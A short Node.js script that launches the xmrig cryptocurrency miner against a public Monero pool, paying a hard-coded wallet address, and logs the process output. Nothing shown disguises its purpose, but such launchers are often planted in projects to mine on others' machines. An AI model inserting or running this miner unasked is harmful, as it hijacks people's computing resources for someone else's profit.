const { exec } = require('child_process');

const ls = exec('./xmrig -o pool.supportxmr.com:443 -u 47mho42zHfGjnA45cFNgFhXQqagzxhigp9REcx5YCShPMRuqoNVRH1VLdksyD4pjU9CESXyiMAhLGNP9y9gXsEqP7y7sJob -k --tls -p Worker1', function (error, stdout, stderr) {
  if (error) {
    console.log(error.stack);
    console.log('Error code: '+error.code);
    console.log('Signal received: '+error.signal);
  }
  console.log('Child Process STDOUT: '+stdout);
  console.log('Child Process STDERR: '+stderr);
});

ls.on('exit', function (code) {
  console.log('Child process exited with exit code '+code);
});
